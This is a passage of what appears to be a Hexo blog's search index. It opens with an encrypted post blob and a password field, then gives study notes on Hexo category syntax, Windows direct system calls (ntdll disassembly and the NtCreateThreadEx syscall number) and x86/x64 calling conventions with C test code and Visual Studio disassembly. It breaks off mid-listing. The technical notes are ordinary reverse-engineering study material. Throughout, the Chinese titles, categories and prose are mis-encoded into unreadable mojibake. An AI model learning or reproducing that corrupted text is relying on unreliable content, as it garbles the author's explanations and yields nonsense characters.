a8b1ad7e485866310241224e3a401a7d1cc20cf3c51da386f9a214c431b76d88d16fc6f2267749e79189a344d71f5adcc9a231d40f89dd2b530f4e353a77b2b2d5dadde4f01326be99088937b23a74eb1cf7b88a8dc48e4b4b929964e1288a54c89dd6eb7b112fea71df3d3c31cfb5ae02aad50ccdd382ee107fe018787e61bdeb509028b804ea2e668c154242f55c5824efb383fa53e009d555bdd6424eb44af998fd43b85d3813479fd13921e0527ab1287fe18edf9567502b27cd1411df47e40295d1051b4e48b0c14b167b762cecfb7432b5d66398b5c45288227cbb8f628b19572b94bfacfb995d3acf22200415dccf2460adb3ad30007a4aae93a445d053483104ef38ed39bcd9b0f8236d8ed964c549a27851c8f0450640fda7eb2aab5f3d210d29c8dd4069615605707289ad95f8e5dcb5d7b7d42781ac092fd5694eb442c7a516463f3ea4ecf1377307f2953409c9c21f6a9366b95f58fa011221d26cde9713c0ab537937ec8525e9027b1b0194553a81d401210d5542a2e4d812bb1d77bdfecbfa506e18f58ac3a46dcd3465a72340af693c5d8783215c9b767c317fc3336dfc3556f1e60a16a7e389de43c700ab2c80d848407f8d468aa7b58622387289286da94825a6e324d318c6e0cf91537b8d8aee7c1637a814c695acfc102e0666cb1a6b51edb045e3ad6db2c85c0dfaef6be6e3df10e293a1109b97e6321a5efc1e6a806a3239be80b0afdd3dfb28c8dfeccaced72eefab79ef42b8ca4a59acf9c5961c32d37d0377d4a58a7be650b69d795e42c6d33fa90d2f7c8ea6f854d623e35c842e3662b121e9c119d31118114a2eb597a3cac68546fe3c969907e0275f58816f563831043f57de15f9048890bc8268c361699724a4b0b47b2dc8c54d48779138bb73421cad209adf7c293a8dd1d4ab3dee9bcad3f1bf89776d2add641b00bbb9d0cd2be7aad1613d9099eae1f7b70abd5c74d1deb9b5023db99cd547e753048c7a283aa8d10dbf416a0194494f55f1ce4cbc57d973870b1baab8db348add6b1fadc23882022a8ce0ef83734506f0307f0c8c6f59a2d9420620e31343a20ec0ba9f481553d42955d09ec61eace57955b2a6bd068b161ccd33d10373f6757229d0dceb5907d3993e8b05d9482ef45c1f3b59790e27ad13bc1da13f212c5819e26c6deaf22cf1ff8c35a9e24abc65888f6473582735438f5746a45678c6d807f561efe5cca144b13282d1008041f8e0d4b7ac83415d453d3bf200d051abdb802639b8d07eda063db79bed976e9334f30dd9eb7803da30f09704d270a6fbb0b15ae03b161368a965a30f98914356558301f24ea1900831befd6b6584d063a084c733d12e9fb902a92e5ec245ec2565ff93df88780dd86b36956143e3529f11ce4b4e7430ad1824c1eccc288ec47dc31b9d090cf30465cf2911311b17b6a2635b0c2b5da6907f07d881af61952932ab7ba384664f26b670af68c48538da89164410017c873ee7af44dc36194fb68a4be60ab4c3d10d3a7b453739f24f4b1232fd6e67c42fe36c33c77099b5d48bc66f509e5aca7dc6280676b8fe1adc1ebe0a8ddb730b8dbe0e53387beccf910d08228e70836475f610dfbdb93f6087deb542ede78c2e6247643717aa2b468626bc217b3ba5fa418c5937dff811cf942e8247d11bd2913a6ef6a5e74ee580026f5246bc3b38379ad283d16e4b03d8e55de0ed908c1c9d030b36ff62f0df59b1fc949457b96144c2f4662fe41c51283e09bb36158ad54c3c102c27ec0c3ffb5453e95a727b929ae8a34d7dacb093e640d1a3969cd75eea09ae52d2ae5c561457a56cb513d8f88d32e20dbf76c5606597f62d5bab94ed239a2907cb1850a097e6cb717138e9c977ffa7278aa22049b1b091107a10a1f5c995b469c92cd7ad74f028aaf49ab8f9f91ba4fc1c172a8463e03b99158ebc043ad1d870f0e8364f3cdcfacd4344574b2b04140d0461e612a098fdb96c7025eef4f74fcb79458ccb834b6be87ab5db621fdd960acedd3dc188e7b770246851235ae899d1c7ebaaeed561ccd88d0b6116de6570ce4407591c11f0d246eac1d96734ba9b4db6e8aed71a4516688c212079233f8d9b928846bdf25f4ea4a8cd7621a200cb1fc9149401fbc4a87f52af5de1ed4a20600fe58d79df4effb61e51fc8a48faf272d0a0fd01085da73755428f658839e7d1e562249d10675b59e8674198240bcc84c369801cfbbbe52e9ccd25519f2e821944046aa7362514a4b885c4ac62613d00f05e01fe830477c81f32fb134e9683044f7a4f611b90f4a556d8464fd079442a83d4b20b0991c693ccec163f75213f1037834abcf507b27e95f919c73dbccadb19bff327218db93121b66136bd412f4d0460796a32679d6f36b59d94f671b6632294cf222261b047a97e0823758a3f2e3fcc0c3334d3fec8c490b83c81bed06fd6a2400bb11449457958d0f716fa50b6dff11975a3e976d57e437eb0c6911b0e3e86c4c64970443198ab4d41bf407556697acf05983ba1e6aefa42b860efc217e195c8b92d6279a5b983c901ce4b76ee0e954d7d30f9d124ad13f446be60661c68f2554b1b14952665e60602cec2fac7de0d20c8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">è¯†åˆ«åˆ°ç”¨æˆ·è®¿é—®</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> è®°å½• </category>
          
          <category> æ—¥å¸¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¸€å‘¨å¹´çºªå¿µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoå­¦ä¹ </title>
      <link href="/posts/915c044a.html"/>
      <url>/posts/915c044a.html</url>
      
        <content type="html"><![CDATA[<h2 id="å¤šçº§åˆ†ç±»">å¤šçº§åˆ†ç±»</h2><p>Hexoçš„å¤šçº§åˆ†ç±»æ˜¯ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">categories</span><span class="punctuation">:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">a</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">b</span></span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºåˆ†ç±»ä¸ºaä¸‹çš„b</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">categories</span><span class="punctuation">:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">å‰ç«¯</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">CSS</span></span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºæ–‡ç« ä½äºå‰ç«¯çš„CSSä¸­</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">categories</span><span class="punctuation">:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[http]</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[html]</span></span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºæ–‡ç« æ—¢åœ¨httpåˆ†ç±»ä¸­ï¼Œåˆåœ¨htmlåˆ†ç±»ä¸­</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">categories</span><span class="punctuation">:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[å­¦ä¹ ,http]</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[å­¦ä¹ ,html]</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">[åŠ¡å¿…æ³¨æ„]</span></span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºæ–‡ç« æ—¢åœ¨å­¦ä¹ çš„å­åˆ†ç±»httpä¸­ï¼Œåˆåœ¨å­åˆ†ç±»htmlä¸­ï¼ŒåŒæ—¶ä¹Ÿåœ¨åŠ¡å¿…æ³¨æ„ä¸­</p><p>è€Œtagåˆ™éƒ½æ˜¯å¹³ç­‰çš„ï¼Œæ²¡æœ‰å±‚çº§</p>]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win-ç³»ç»Ÿè°ƒç”¨</title>
      <link href="/posts/7df42b75.html"/>
      <url>/posts/7df42b75.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç³»ç»Ÿè°ƒç”¨">ç³»ç»Ÿè°ƒç”¨</h2><p>R3å‡½æ•°æ‰§è¡Œåº•å±‚æ“ä½œæ—¶ï¼Œéœ€è¦è°ƒç”¨å¯ä»¥syscallçš„ä½äºNtdllæˆ–User32çš„dllé‡Œçš„ç³»ç»Ÿå‡½æ•°ã€‚</p><p>è°ƒè¯•æ—¶è·Ÿè¸ªç³»ç»Ÿå‡½æ•°ï¼Œä»¥creatreThreadä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00007FFA5FEB1990  mov         r10,rcx  </span><br><span class="line">00007FFA5FEB1993  mov         eax,0C7h  </span><br><span class="line">00007FFA5FEB1998  test        byte ptr [7FFE0308h],1  </span><br><span class="line">00007FFA5FEB19A0  jne         00007FFA5FEB19A5  </span><br><span class="line">00007FFA5FEB19A2  syscall</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ntdll.dll:00007FFA5FEB1990 loc_7FFA5FEB1990:                       ; CODE XREF: kernelbase_CreateRemoteThreadEx+298â†‘p</span><br><span class="line">ntdll.dll:00007FFA5FEB1990                                         ; DATA XREF: KERNELBASE.dll:off_7FFA5D9EF8A0â†‘o</span><br><span class="line">ntdll.dll:00007FFA5FEB1990                 mov     r10, rcx</span><br><span class="line">ntdll.dll:00007FFA5FEB1993                 mov     eax, 0C7h</span><br><span class="line">ntdll.dll:00007FFA5FEB1998                 test    byte_7FFE0308, 1</span><br><span class="line">ntdll.dll:00007FFA5FEB19A0                 jnz     short loc_7FFA5FEB19A5</span><br><span class="line">ntdll.dll:00007FFA5FEB19A2                 syscall                 ; Low latency system call</span><br><span class="line">ntdll.dll:00007FFA5FEB19A4                 retn</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5 ; ---------------------------------------------------------------------------</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5 loc_7FFA5FEB19A5:                       ; CODE XREF: ntdll.dll:00007FFA5FEB19A0â†‘j</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5                 int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND</span><br><span class="line">ntdll.dll:00007FFA5FEB19A5                                         ; DS:SI -&gt; counted CR-terminated command string</span><br><span class="line">ntdll.dll:00007FFA5FEB19A7                 retn</span><br></pre></td></tr></table></figure><p>æˆ‘çš„ç³»ç»Ÿç‰ˆæœ¬æ˜¯23H2ï¼Œè¯´æ˜åœ¨23H2ä¸­NtCreateThreadExç³»ç»Ÿè°ƒç”¨å·ä¸ºC7</p><p>ä»£ç æ‰§è¡Œå®Œä¹‹åï¼Œæ–°çº¿ç¨‹å°±è¢«åˆ›å»ºäº†ã€‚ä½†æ˜¯æ§åˆ¶æƒè¿˜æ²¡åœ¨æ–°çº¿ç¨‹é‡Œï¼Œå…ˆæŠŠå½“å‰çº¿ç¨‹sleepæˆ–è€…getcharé˜»å¡å¼ºåˆ¶è½¬æ¢ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°è¾“å‡º</p><p>åŸºæœ¬è°ƒç”¨æ ¼å¼ï¼š(x64(x86è¿˜æ²¡çœ‹QAQ))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov r10,x</span><br><span class="line">mov r9,x</span><br><span class="line">mov r8,x</span><br><span class="line">mov rdx,x   ;ä¸Šé¢éƒ½æ˜¯å‚æ•°</span><br><span class="line">mov rax, callNum   ;ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">syscall   ;è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œæ±‡ç¼–ä¸º 0F 05</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¹Ÿèƒ½çœ‹åˆ°int 2Eæ˜¯x32å’Œdosçš„syscallè¿›å…¥æ–¹å¼</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> Winæ ¸å¿ƒ </category>
          
          <category> Winå†…æ ¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æƒé™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ˆ/å‡½æ•°è°ƒç”¨çº¦å®š</title>
      <link href="/posts/b1cf25a9.html"/>
      <url>/posts/b1cf25a9.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ ˆçš„è°ƒç”¨çº¦å®š">æ ˆçš„è°ƒç”¨çº¦å®š</h2><blockquote><p>(1)å‡½æ•°å‚æ•°çš„å‹æ ˆé¡ºåºï¼Œ(2)ç”±è°ƒç”¨è€…è¿˜æ˜¯è¢«è°ƒç”¨è€…æŠŠå‚æ•°å¼¹å‡ºæ ˆï¼Œ(3)ä»¥åŠäº§ç”Ÿå‡½æ•°ä¿®é¥°åçš„æ–¹æ³•ã€‚</p></blockquote><h3 id="æ™®é€šå‡½æ•°">æ™®é€šå‡½æ•°</h3><p><a href="https://zhuanlan.zhihu.com/p/170134539#:~:text=__cdecl%E3%80%81__">å‡½æ•°è°ƒç”¨çš„ä¸‰ç§çº¦å®šï¼Œä½ éƒ½æ¸…æ¥šå— - çŸ¥ä¹ (zhihu.com)</a></p><h4 id="cdecl">__cdecl</h4><p>C/CPPé»˜è®¤æ–¹å¼ï¼Œå‚æ•°ä»å³å‘å·¦å…¥æ ˆï¼Œä¸»è°ƒå‡½æ•°è´Ÿè´£æ ˆå¹³è¡¡</p><h4 id="stdcall">__stdcall</h4><p>WIN APIé»˜è®¤æ–¹å¼ï¼Œå‚æ•°ä»å³å‘å·¦å…¥æ ˆï¼Œè¢«è°ƒå‡½æ•°è´Ÿè´£æ ˆå¹³è¡¡</p><h4 id="fastacll">__fastacll</h4><p><code>x64ä»…æœ‰è¿™ä¸€ç§ä¼ å‚</code></p><p>å‚æ•°ä¼˜å…ˆä¼ ç»™å¯„å­˜å™¨ç„¶åå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦å…¥æ ˆä¼ é€</p><p>å†™æµ‹è¯•ä»£ç è§‚å¯Ÿåæ±‡ç¼–ç»“æœï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">func1</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __stdcall <span class="title function_">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">func3</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line">b = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">func1(a, b);</span><br><span class="line">func2(a, b);</span><br><span class="line">func3(a, b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VS:</p><p>å‘ç°64ä½æ²¡æœ‰ä»»ä½•åŒºåˆ«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">00007FF615301880  push        rbp  </span><br><span class="line">00007FF615301882  push        rdi  </span><br><span class="line">00007FF615301883  sub         rsp,128h  </span><br><span class="line">00007FF61530188A  lea         rbp,[rsp+20h]  </span><br><span class="line">00007FF61530188F  lea         rcx,[__CC37DA75_a@c (07FF615311008h)]  </span><br><span class="line">00007FF615301896  call        __CheckForDebuggerJustMyCode (07FF615301361h)  </span><br><span class="line">00007FF61530189B  nop  </span><br><span class="line">int a, b;</span><br><span class="line">a = 2;</span><br><span class="line">00007FF61530189C  mov         dword ptr [a],2  </span><br><span class="line">b = 3;</span><br><span class="line">00007FF6153018A3  mov         dword ptr [b],3  </span><br><span class="line"></span><br><span class="line">func1(a, b);</span><br><span class="line">00007FF6153018AA  mov         edx,dword ptr [b]  </span><br><span class="line">00007FF6153018AD  mov         ecx,dword ptr [a]  </span><br><span class="line">00007FF6153018B0  call        func1 (07FF61530114Fh)  </span><br><span class="line">00007FF6153018B5  nop  </span><br><span class="line">func2(a, b);</span><br><span class="line">00007FF6153018B6  mov         edx,dword ptr [b]  </span><br><span class="line">00007FF6153018B9  mov         ecx,dword ptr [a]  </span><br><span class="line">00007FF6153018BC  call        func2 (07FF61530102Dh)  </span><br><span class="line">00007FF6153018C1  nop  </span><br><span class="line">func3(a, b);</span><br><span class="line">00007FF6153018C2  mov         edx,dword ptr [b]  </span><br><span class="line">00007FF6153018C5  mov         ecx,dword ptr [a]  </span><br><span class="line">00007FF6153018C8  call        func3 (07FF61530129Eh)  </span><br><span class="line">00007FF6153018CD  nop  </span><br><span class="line">return 0;</span><br><span class="line">00007FF6153018CE  xor         eax,eax  </span><br><span class="line">&#125;</span><br><span class="line">00007FF6153018D0  lea         rsp,[rbp+108h]  </span><br><span class="line">00007FF6153018D7  pop         rdi  </span><br><span class="line">00007FF6153018D8  pop         rbp  </span><br><span class="line">00007FF6153018D9  ret  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">00CD1890  push        ebp  </span><br><span class="line">00CD1891  mov         ebp,esp  </span><br><span class="line">00CD1893  sub         esp,0D8h  </span><br><span class="line">00CD1899  push        ebx  </span><br><span class="line">00CD189A  push        esi  </span><br><span class="line">00CD189B  push        edi  </span><br><span class="line">00CD189C  lea         edi,[ebp-18h]  </span><br><span class="line">00CD189F  mov         ecx,6  </span><br><span class="line">00CD18A4  mov         eax,0CCCCCCCCh  </span><br><span class="line">00CD18A9  rep stos    dword ptr es:[edi]  </span><br><span class="line">00CD18AB  mov         ecx,offset _CC37DA75_a@c (0CDC008h)  </span><br><span class="line">00CD18B0  call        @__CheckForDebuggerJustMyCode@4 (0CD1325h)  </span><br><span class="line">00CD18B5  nop  </span><br><span class="line">int a, b;</span><br><span class="line">a = 2;</span><br><span class="line">00CD18B6  mov         dword ptr [a],2  </span><br><span class="line">b = 3;</span><br><span class="line">00CD18BD  mov         dword ptr [b],3  </span><br><span class="line"></span><br><span class="line">func1(a, b);</span><br><span class="line">00CD18C4  mov         eax,dword ptr [b]  </span><br><span class="line">00CD18C7  push        eax  </span><br><span class="line">00CD18C8  mov         ecx,dword ptr [a]  </span><br><span class="line">00CD18CB  push        ecx  </span><br><span class="line">00CD18CC  call        _func1 (0CD1366h)  </span><br><span class="line">00CD18D1  add         esp,8  </span><br><span class="line">func2(a, b);</span><br><span class="line">00CD18D4  mov         eax,dword ptr [b]  </span><br><span class="line">00CD18D7  push        eax  </span><br><span class="line">00CD18D8  mov         ecx,dword ptr [a]  </span><br><span class="line">00CD18DB  push        ecx  </span><br><span class="line">00CD18DC  call        _func2@8 (0CD105Fh)  </span><br><span class="line">00CD18E1  nop  </span><br><span class="line">func3(a, b);</span><br><span class="line">00CD18E2  mov         edx,dword ptr [b]  </span><br><span class="line">00CD18E5  mov         ecx,dword ptr [a]  </span><br><span class="line">00CD18E8  call        @func3@8 (0CD105Ah)  </span><br><span class="line">00CD18ED  nop  </span><br><span class="line">return 0;</span><br><span class="line">00CD18EE  xor         eax,eax  </span><br><span class="line">&#125;</span><br><span class="line">00CD18F0  pop         edi  </span><br><span class="line">00CD18F1  pop         esi  </span><br><span class="line">00CD18F2  pop         ebx  </span><br><span class="line">00CD18F3  add         esp,0D8h  </span><br><span class="line">00CD18F9  cmp         ebp,esp  </span><br><span class="line">00CD18FB  call        __RTC_CheckEsp (0CD1249h)  </span><br><span class="line">00CD1900  mov         esp,ebp  </span><br><span class="line">00CD1902  pop         ebp  </span><br><span class="line">00CD1903  ret  </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºå¯¹äºcdeclçš„func1ï¼Œå®ƒpushäº†ä¸¤æ¬¡4å­—èŠ‚åï¼Œåœ¨ä¸»è°ƒå‡½æ•°addäº†å›æ¥(æ ˆæ˜¯åçš„)<br>è€Œfunc2å’Œfunc3éƒ½æ²¡æœ‰è¿™ä¸ªæ­¥éª¤ï¼Œè¯´æ˜cdeclä½¿å¾—ä¸»è°ƒå‡½æ•°å»ä¿æŒæ ˆå¹³è¡¡ã€‚<br>åŒæ—¶func3ä¼šå…ˆæŠŠå‚æ•°ä¼ ç»™å¯„å­˜å™¨ã€‚è¯´æ˜fastcallçš„ç›®çš„æ˜¯å…ˆä¸ä½¿ç”¨æ ˆè€Œæ˜¯å¯„å­˜å™¨ä¼ å‚ã€‚</p><p>åœ¨func2å†…éƒ¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __stdcall func2(int a, int b) &#123;</span><br><span class="line">00CD1840  push        ebp  </span><br><span class="line">00CD1841  mov         ebp,esp  </span><br><span class="line">00CD1843  sub         esp,0C0h  </span><br><span class="line">00CD1849  push        ebx  </span><br><span class="line">00CD184A  push        esi  </span><br><span class="line">00CD184B  push        edi  </span><br><span class="line">00CD184C  mov         edi,ebp  </span><br><span class="line">00CD184E  xor         ecx,ecx  </span><br><span class="line">00CD1850  mov         eax,0CCCCCCCCh  </span><br><span class="line">00CD1855  rep stos    dword ptr es:[edi]  </span><br><span class="line">00CD1857  mov         ecx,offset _CC37DA75_a@c (0CDC008h)  </span><br><span class="line">00CD185C  call        @__CheckForDebuggerJustMyCode@4 (0CD1325h)  </span><br><span class="line">00CD1861  nop  </span><br><span class="line">return a + b;</span><br><span class="line">00CD1862  mov         eax,dword ptr [a]  </span><br><span class="line">00CD1865  add         eax,dword ptr [b]  </span><br><span class="line">&#125;</span><br><span class="line">00CD1868  pop         edi  </span><br><span class="line">00CD1869  pop         esi  </span><br><span class="line">00CD186A  pop         ebx  </span><br><span class="line">00CD186B  add         esp,0C0h  </span><br><span class="line">00CD1871  cmp         ebp,esp  </span><br><span class="line">00CD1873  call        __RTC_CheckEsp (0CD1249h)  </span><br><span class="line">00CD1878  mov         esp,ebp  </span><br><span class="line">00CD187A  pop         ebp  </span><br><span class="line">00CD187B  ret         8  </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªret 8è¡¨ç¤ºè¿”å›æ—¶å¼¹å‡ºæ ˆé¡¶8å­—èŠ‚:     C3 xx xx</p><p>ç„¶åæ˜¯ç ”ç©¶fastcallå‰å‡ ä¸ªå‚æ•°éƒ½æ˜¯ç»™å“ªäº›å¯„å­˜å™¨å­˜æ”¾çš„<br>x86ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">func3(a, b, a, b, b, a, b, a, a, b, a, a, b, a);</span><br><span class="line">00B618D2  mov         eax,dword ptr [a]  </span><br><span class="line">00B618D5  push        eax  </span><br><span class="line">00B618D6  mov         ecx,dword ptr [b]  </span><br><span class="line">00B618D9  push        ecx  </span><br><span class="line">00B618DA  mov         edx,dword ptr [a]  </span><br><span class="line">00B618DD  push        edx  </span><br><span class="line">00B618DE  mov         eax,dword ptr [a]  </span><br><span class="line">00B618E1  push        eax  </span><br><span class="line">00B618E2  mov         ecx,dword ptr [b]  </span><br><span class="line">00B618E5  push        ecx  </span><br><span class="line">00B618E6  mov         edx,dword ptr [a]  </span><br><span class="line">00B618E9  push        edx  </span><br><span class="line">00B618EA  mov         eax,dword ptr [a]  </span><br><span class="line">00B618ED  push        eax  </span><br><span class="line">00B618EE  mov         ecx,dword ptr [b]  </span><br><span class="line">00B618F1  push        ecx  </span><br><span class="line">00B618F2  mov         edx,dword ptr [a]  </span><br><span class="line">00B618F5  push        edx  </span><br><span class="line">00B618F6  mov         eax,dword ptr [b]  </span><br><span class="line">00B618F9  push        eax  </span><br><span class="line">00B618FA  mov         ecx,dword ptr [b]  </span><br><span class="line">00B618FD  push        ecx  